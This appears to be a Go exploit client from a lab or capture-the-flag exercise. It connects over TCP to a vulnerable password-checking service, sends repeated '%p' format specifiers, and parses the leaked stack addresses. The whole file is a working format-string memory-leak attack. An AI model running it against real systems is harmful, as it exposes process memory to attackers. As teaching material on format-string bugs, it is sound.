package main

import (
	"bytes"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
)

func main() {
	log.SetFlags(0)

	bufLenByes := flag.Int("l", 104, "The length of the buf variable in bytes")

	flag.Parse()

	if flag.NArg() != 1 {
		log.Fatalln("please specify the address to connect to")
	}

	fmtStr := bytes.Repeat([]byte("%p"), *bufLenByes/2)

	output, err := dialAndSendBytes(flag.Arg(0), fmtStr)
	if err != nil {
		log.Fatalf("failed to read all output - %s", err)
	}

	log.Printf("output from vulnerable program: '%s'", output)

	err = stackChunksFromFmtStr(output)
	if err != nil {
		log.Fatalf("failed to parse format string output - %s", err)
	}
}

func dialAndSendBytes(serverAddr string, b []byte) ([]byte, error) {
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		return nil, fmt.Errorf("failed to dial - %w", err)
	}
	defer conn.Close()

	_, err = conn.Write(b)
	if err != nil {
		return nil, fmt.Errorf("failed to write data - %w", err)
	}

	output, err := io.ReadAll(conn)
	if err != nil {
		return nil, fmt.Errorf("failed to read all output - %w", err)
	}

	return output, nil
}

// Example format string output:
//	incorrect password: 0x110x7fffffffe4b00x14(nil)0x7fffffffe8c60x400000001
func stackChunksFromFmtStr(output []byte) error {
	if len(bytes.TrimSpace(output)) == 0 {
		return errors.New("format string func output is empty")
	}

	output = bytes.ReplaceAll(output, []byte("(nil)"), []byte("0x00"))
	chunks := bytes.Split(output, []byte("0x"))
	// Start at index 1 to skip "incorrect password: ".
	chunks = chunks[1:]

	for i, chunk := range chunks {
		log.Printf("chunk %d: %s", i, chunk)
	}

	return nil
}
